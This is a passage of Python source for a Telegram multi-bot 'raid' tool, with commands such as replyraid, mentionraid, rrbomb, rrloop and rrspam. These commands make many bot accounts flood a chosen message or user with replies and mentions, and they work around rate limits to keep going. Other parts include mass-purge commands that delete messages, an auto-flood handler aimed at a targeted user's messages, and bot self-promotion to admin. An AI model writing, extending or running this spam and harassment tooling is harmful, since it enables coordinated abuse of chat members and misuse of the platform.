    if not txt:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  ⚔️ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃\n"
            "  𝘙𝘦𝘱𝘭𝘺 𝘵𝘰 𝘢 𝘮𝘴𝘨 𝘢𝘯𝘥:\n"
            "  -replyraid <text>\n"
            "  𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘳𝘦𝘱𝘭𝘺-𝘴𝘱𝘢𝘮 𝘵𝘩𝘢𝘵 𝘮𝘴𝘨\n"
            "╚══════════════════════════════╝"
        )
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return
    target_mid = rep.message_id if rep else msg.message_id
    RAID_VARS = [
        f"⚔️ {txt}",
        f"🔥 {txt}",
        f"💀 {txt}",
        f"⚡ {txt}",
        f"💥 {txt}",
        f"👑 {txt}",
        f"🔱 {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = RAID_VARS[idx[0] % len(RAID_VARS)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target_mid, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))

    await tc.start(cid, "replyraid", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚔️ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  💬 {txt}\n"
        f"  🤖 {len(bots)} 𝘣𝘰𝘵𝘴 𝘳𝘢𝘪𝘥𝘪𝘯𝘨\n"
        f"  -stopreplyraid to stop\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stopreplyraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "replyraid")
    await _reply(msg, "⛔ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_massreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    txt = _txt_arg(ctx)
    if not (txt and rep):
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 + -massreply <text>\n𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘳𝘦𝘱𝘭𝘺 𝘰𝘯𝘤𝘦 𝘦𝘢𝘤𝘩")
        return
    bots = _bots()

    async def _mass(bot):
        try:
            await bot.send_message(cid, txt, reply_parameters=ReplyParameters(message_id=rep.message_id, allow_sending_without_reply=False))
        except Exception:
            pass

    tasks = [asyncio.create_task(_mass(b)) for b in bots]
    await asyncio.gather(*tasks, return_exceptions=True)
    await _reply(msg, f"✅ 𝐌𝐀𝐒𝐒 𝐑𝐄𝐏𝐋𝐘 𝐒𝐄𝐍𝐓 ({len(bots)} 𝘣𝘰𝘵𝘴)")

@_guard
async def cmd_mentionraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "𝐔𝐬𝐞: -mentionraid <uid> <text>\n"
            "𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘮𝘦𝘯𝘵𝘪𝘰𝘯-𝘴𝘱𝘢𝘮 𝘵𝘢𝘳𝘨𝘦𝘵"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃")
        return
    txt  = " ".join(args[1:]).strip()
    bots = _bots()

    async def _run(stop_ev):
        while not stop_ev.is_set():
            tasks = []
            for bot in bots:
                if stop_ev.is_set():
                    break
                async def _s(b=bot):
                    try:
                        await b.send_message(
                            cid,
                            f'<a href="tg://user?id={uid}">⚡</a> {txt}',
                            parse_mode="HTML"
                        )
                    except Exception:
                        pass
                tasks.append(asyncio.create_task(_s()))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

    await tc.start(cid, "mentionraid", _run)
    await _reply(msg,
        f"⚔️ 𝐌𝐄𝐍𝐓𝐈𝐎𝐍 𝐑𝐀𝐈𝐃 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"👤 𝘛𝘢𝘳𝘨𝘦𝘵: {uid}\n"
        f"💬 {txt}\n"
        f"-stopmentionraid to stop"
    )

@_guard
async def cmd_stopmentionraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "mentionraid")
    await _reply(msg, "⛔ 𝐌𝐄𝐍𝐓𝐈𝐎𝐍 𝐑𝐀𝐈𝐃 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

# ═══════════════════════════════════════════
#  PURGE COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_purge(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    try:
        count = int(args[0]) if args else 50
    except ValueError:
        count = 50
    count = min(count, 5000)   # safety cap — prevents ban from mass delete
    rep   = msg.reply_to_message
    from_id = rep.message_id if rep else (msg.message_id - count)
    deleted = 0
    bots    = _bots()
    bot     = bots[0] if bots else None
    if not bot:
        await _reply(msg, "⚠️ No bots available")
        return
    ids_to_del = list(range(max(1, from_id), msg.message_id + 1))
    for chunk in [ids_to_del[i:i+100] for i in range(0, len(ids_to_del), 100)]:
        for bot in bots:
            try:
                await bot.delete_messages(cid, chunk)
                deleted += len(chunk)
                break
            except Exception:
                try:
                    for mid in chunk:
                        try:
                            await bot.delete_message(cid, mid)
                            deleted += 1
                        except Exception:
                            pass
                    break
                except Exception:
                    pass
        await asyncio.sleep(0.1)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐃\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_purgeme(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    user = update.effective_user
    args = _get_args(ctx)
    try:
        count = int(args[0]) if args else 20
    except ValueError:
        count = 20
    bots    = _bots()
    bot     = bots[0] if bots else None
    if not bot:
        await _reply(msg, "⚠️ No bots available")
        return
    deleted = 0
    # Scan 5× the requested count to reliably find enough user messages
    ids_to_check = list(range(max(1, msg.message_id - max(count * 5, 200)), msg.message_id + 1))
    for mid in reversed(ids_to_check):
        if deleted >= count:
            break
        for b in bots:
            try:
                await b.delete_message(cid, mid)
                deleted += 1
                break
            except Exception:
                pass
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐌𝐄\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_purgebot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚠️ No bots available")
        return
    deleted = 0
    ids_to_check = list(range(max(1, msg.message_id - 300), msg.message_id + 1))
    for mid in reversed(ids_to_check):
        for b in bots:
            try:
                await b.delete_message(cid, mid)
                deleted += 1
                break
            except Exception:
                pass
        await asyncio.sleep(0.01)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐁𝐎𝐓\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘣𝘰𝘵 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_purgeall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚠️ No bots available")
        return
    deleted = 0
    ids_to_check = list(range(max(1, msg.message_id - 500), msg.message_id + 1))
    for chunk in [ids_to_check[i:i+100] for i in range(0, len(ids_to_check), 100)]:
        for b in bots:
            try:
                await b.delete_messages(cid, chunk)
                deleted += len(chunk)
                break
            except Exception:
                for mid in chunk:
                    for b2 in bots:
                        try:
                            await b2.delete_message(cid, mid)
                            deleted += 1
                            break
                        except Exception:
                            pass
                break
        await asyncio.sleep(0.05)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐀𝐋𝐋\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )


# ═══════════════════════════════════════════
#  MORE REPLY RAID (RR) COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_rrbomb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    rep  = msg.reply_to_message
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -rrbomb <text> [count]\n𝘉𝘶𝘳𝘴𝘵 𝑁 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘰𝘯 𝘢 𝘮𝘴𝘨")
        return
    try:
        count = int(args[-1])
        txt   = " ".join(args[:-1]).strip()
        if not txt:
            raise ValueError
    except (ValueError, IndexError):
        txt   = " ".join(args).strip()
        count = 15
    count    = min(count, 50)
    target   = rep.message_id if rep else msg.message_id
    bots     = _bots()
    BOMB_V   = [
        f"💣 {txt}",
        f"🔥 {txt}",
        f"⚔️ {txt}",
        f"💀 {txt}",
        f"👑 {txt}",
    ]

    async def _bomb(i, b=None):
        b = b or bots[i % len(bots)]
        v = BOMB_V[i % len(BOMB_V)]
        for _ in range(3):
            try:
                await b.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                return
            except RetryAfter as e:
                await asyncio.sleep(min(float(e.retry_after) + 0.3, 3.0))
            except Exception:
                return

    tasks = [asyncio.create_task(_bomb(i)) for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await _reply(msg, f"💣 𝐑𝐑𝐁𝐎𝐌𝐁 — {count} 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘴𝘦𝘯𝘵")

@_guard
async def cmd_rrloop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid    = msg.chat_id
    rep    = msg.reply_to_message
    txt    = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 + -rrloop <text>\n"
            "𝘓𝘰𝘰𝘱 𝘳𝘦𝘱𝘭𝘺𝘪𝘯𝘨 𝘵𝘰 𝘵𝘩𝘢𝘵 𝘮𝘴𝘨 𝘧𝘰𝘳𝘦𝘷𝘦𝘳"
        )
        return
    target = rep.message_id if rep else msg.message_id
    bots   = _bots()
    LOOP_V = [
        f"🔁 {txt}",
        f"♾️ {txt}",
        f"🌀 {txt}",
        f"👑 {txt}",
        f"💎 {txt}",
        f"⚡ {txt}",
        f"🔥 {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = LOOP_V[idx[0] % len(LOOP_V)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))

    await tc.start(cid, "rrloop", _run)
    await _reply(msg,
        f"♾️ 𝐑𝐑𝐋𝐎𝐎𝐏 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"💬 {txt}\n"
        f"🎯 𝘳𝘦𝘱𝘭𝘺𝘪𝘯𝘨 𝘵𝘰 msg#{target}\n"
        f"-stoprrloop to stop"
    )

@_guard
async def cmd_stoprrloop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "rrloop")
    await _reply(msg, "⛔ 𝐑𝐑𝐋𝐎𝐎𝐏 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_multirr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid    = msg.chat_id
    rep    = msg.reply_to_message
    txt    = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 + -multirr <text>\n"
            "𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘧𝘪𝘳𝘦 𝘴𝘪𝘮𝘶𝘭𝘵𝘢𝘯𝘦𝘰𝘶𝘴𝘭𝘺"
        )
        return
    target = rep.message_id if rep else msg.message_id
    bots   = _bots()
    MULTI_V = [
        f"⚔️ {txt}",
        f"🔥 {txt}",
        f"💀 {txt}",
        f"🌊 {txt}",
        f"⚡ {txt}",
        f"💥 {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = MULTI_V[idx[0] % len(MULTI_V)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))

    await tc.start(cid, "multirr", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚔️ 𝐌𝐔𝐋𝐓𝐈𝐑𝐑 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  🤖 {len(bots)} 𝘣𝘰𝘵𝘴 𝘴𝘪𝘮𝘶𝘭𝘵𝘢𝘯𝘦𝘰𝘶𝘴𝘭𝘺\n"
        f"  💬 {txt}\n"
        f"  -stopmultirr to stop\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stopmultirr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "multirr")
    await _reply(msg, "⛔ 𝐌𝐔𝐋𝐓𝐈𝐑𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_rrspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid    = msg.chat_id
    rep    = msg.reply_to_message
    txt    = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -rrspam <text>  (reply to target msg)")
        return
    target = rep.message_id if rep else msg.message_id
    bots   = _bots()
    VAR = [
        f"🎯 {txt}",
        f"💥 {txt}",
        f"⚡ {txt}",
        f"🔥 {txt}",
        f"⚔️ {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = VAR[idx[0] % len(VAR)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))

    await tc.start(cid, "rrspam", _run)
    await _reply(msg,
        f"🎯 𝐑𝐑𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"💬 {txt} → msg#{target}\n"
        f"-stoprrspam to stop"
    )

@_guard
async def cmd_stoprrspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "rrspam")
    await _reply(msg, "⛔ 𝐑𝐑𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


@_guard
async def cmd_bots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    bots  = _bots()
    lines = [
        "╔══════════════════════╗",
        f"  🤖 𝐁𝐎𝐓𝐒 𝐒𝐓𝐀𝐓𝐔𝐒",
        f"  𝘛𝘰𝘵𝘢𝘭: {len(bots)}",
        "╠══════════════════════╣",
    ]
    for i, bot in enumerate(bots, 1):
        bid   = getattr(bot, "id", id(bot))
        name  = getattr(bot, "username", "unknown")
        flood = "🚫" if _ft.flooded(bid) else "✅"
        lines.append(f"  {flood} Bot {i}: @{name}")
    lines.append("╚══════════════════════╝")
    await _reply(msg, "\n".join(lines))

@_guard
async def cmd_floodstat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    bots    = _bots()
    flooded = sum(1 for b in bots if _ft.flooded(getattr(b, "id", id(b))))
    free    = len(bots) - flooded
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  📊 𝐅𝐋𝐎𝐎𝐃 𝐒𝐓𝐀𝐓𝐒\n"
        f"  ✅ 𝘍𝘳𝘦𝘦: {free}\n"
        f"  🚫 𝘍𝘭𝘰𝘰𝘥𝘦𝘥: {flooded}\n"
        f"  🤖 𝘛𝘰𝘵𝘢𝘭: {len(bots)}\n"
        "╚══════════════════════╝"
    )

@_guard
async def cmd_addsudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    args = _get_args(ctx)
    if not args:
        if msg.reply_to_message and msg.reply_to_message.from_user:
            target = msg.reply_to_message.from_user.id
        else:
            await _reply(msg, "𝐔𝐬𝐞: -addsudo <user_id>")
            return
    else:
        try:
            target = int(args[0])
        except ValueError:
            await _reply(msg, "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃")
            return
    SUDO_USERS.add(target)
    _save_json(SUDO_FILE, [u for u in SUDO_USERS if u != OWNER_ID])
    await _reply(msg, f"✅ 𝐒𝐔𝐃𝐎 𝐀𝐃𝐃𝐄𝐃: {target}")

@_guard
async def cmd_removesudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -removesudo <user_id>")
        return
    try:
        target = int(args[0])
    except ValueError:
        await _reply(msg, "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃")
        return
    SUDO_USERS.discard(target)
    _save_json(SUDO_FILE, [u for u in SUDO_USERS if u != OWNER_ID])
    await _reply(msg, f"⛔ 𝐒𝐔𝐃𝐎 𝐑𝐄𝐌𝐎𝐕𝐄𝐃: {target}")

@_guard
async def cmd_sudolist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    users = [u for u in SUDO_USERS if u != OWNER_ID]
    lst   = "\n".join(f"  • {u}" for u in users) if users else "  𝘕𝘰𝘯𝘦"
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  🔐 𝐒𝐔𝐃𝐎 𝐋𝐈𝐒𝐓\n"
        "╠══════════════════════╣\n"
        f"{lst}\n"
        "╚══════════════════════╝"
    )

@_guard
async def cmd_gclist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    lst = "\n".join(f"  • {c}" for c in known_chats) if known_chats else "  𝘕𝘰𝘯𝘦"
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  📋 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐒𝐓\n"
        "╠══════════════════════╣\n"
        f"{lst}\n"
        "╚══════════════════════╝"
    )

@_guard_any
async def cmd_addbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    ok   = 0
    for bot in bots:
        try:
            await ctx.bot.promote_chat_member(
                cid, bot.id,
                can_change_info=True, can_delete_messages=True,
                can_manage_chat=True,
            )
            ok += 1
        except Exception:
            pass
    await _reply(msg, f"✅ 𝐀𝐝𝐝𝐞𝐝/𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐝 {ok}/{len(bots)} 𝐛𝐨𝐭𝐬")

@_guard
async def cmd_addallbots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_addbot(update, ctx)

@_guard
async def cmd_promotebot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    ok  = 0
    for bot in _bots():
        try:
            await ctx.bot.promote_chat_member(
                cid, bot.id,
                can_change_info=True, can_delete_messages=True,
                can_manage_chat=True,
            )
            ok += 1
        except Exception:
            pass
    await _reply(msg, f"👑 𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝 {ok} 𝐛𝐨𝐭𝐬")

@_guard
async def cmd_botname(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    name = _txt_arg(ctx)
    if not name:
        await _reply(msg, "𝐔𝐬𝐞: -botname <name>")
        return
    ok = 0
    for app in all_apps:
        try:
            await app.bot.set_my_name(name)
            ok += 1
        except Exception:
            pass
    await _reply(msg, f"✅ 𝐁𝐨𝐭 𝐧𝐚𝐦𝐞 𝐬𝐞𝐭: {name} ({ok} 𝐛𝐨𝐭𝐬)")

@_guard
async def cmd_setmenuphoto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    rep = msg.reply_to_message
    if rep and rep.photo:
        _menu_media["photo_id"] = rep.photo[-1].file_id
        _save_json(MEDIA_FILE, _menu_media)
        await _reply(msg, "✅ 𝐌𝐞𝐧𝐮 𝐩𝐡𝐨𝐭𝐨 𝐬𝐞𝐭")
    else:
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨")

@_guard
async def cmd_clearmenu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    _menu_media.clear()
    _save_json(MEDIA_FILE, _menu_media)
    await _reply(msg, "✅ 𝐌𝐞𝐧𝐮 𝐦𝐞𝐝𝐢𝐚 𝐜𝐥𝐞𝐚𝐫𝐞𝐝")

@_guard
async def cmd_globalstop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    total = 0
    for cid in list(known_chats):
        total += await tc.stop_all(cid)
    mute_chats.clear()
    ncdel_chats.clear()
    autoreact_chats.clear()
    autoreply_chats.clear()
    ncwar_targets.clear()
    _multiwar_active.clear()
    targetreply_chats.clear()
    targetslide_chats.clear()
    pfploop_active.clear()
    replyflood_chats.clear()
    _nc_info.clear()
    await _reply(msg, f"🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐓𝐎𝐏 — killed {total} tasks")

async def _on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg or not msg.chat_id:
        return

    cid  = msg.chat_id
    user = update.effective_user
    uid  = user.id if user else None

    known_chats.add(cid)

    if cid in autoreply_chats:
        try:
            await msg.reply_text(autoreply_chats[cid])
        except Exception:
            pass

    if cid in autoreact_chats:
        try:
            await msg.set_reaction([ReactionTypeEmoji(autoreact_chats[cid])])
        except Exception:
            pass

    if cid in ncdel_chats:
        try:
            await msg.delete()
        except Exception:
            pass

    if uid and cid in targetreply_chats:
        tr = targetreply_chats[cid]
        if uid == tr["uid"]:
            async def _tr_send(bot):
                try:
                    await bot.send_message(cid, tr["text"], reply_parameters=ReplyParameters(message_id=msg.message_id, allow_sending_without_reply=False))
                except Exception:
                    pass
            asyncio.create_task(asyncio.gather(*[_tr_send(b) for b in _bots()]))

    if uid and cid in targetslide_chats:
        ts = targetslide_chats[cid]
        if uid == ts["uid"]:
            asyncio.create_task(_fire_slide_burst(cid, ts["text"], msg))

    if cid in replyflood_chats:
        flood_txt = replyflood_chats[cid]
        async def _rf_send(bot):
            try:
                await bot.send_message(cid, flood_txt, reply_parameters=ReplyParameters(message_id=msg.message_id, allow_sending_without_reply=False))
            except Exception:
                pass
        asyncio.create_task(asyncio.gather(*[_rf_send(b) for b in _bots()]))

def _make_friend_cmd(friend: str):
    @_guard
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        await _friend_nc_cmd(update, ctx, friend)
    _cmd.__name__ = f"cmd_{friend.lower()}nc"
    return _cmd

FRIEND_CMDS: Dict[str, Any] = {}
for _f in FRIENDS:
    FRIEND_CMDS[f"{_f.lower()}nc"] = _make_friend_cmd(_f)

CMD_MAP: Dict[str, Any] = {
    "help":              cmd_help,
    "menu":              cmd_help,
    "stop":              cmd_stop,
    "nc":                cmd_nc,
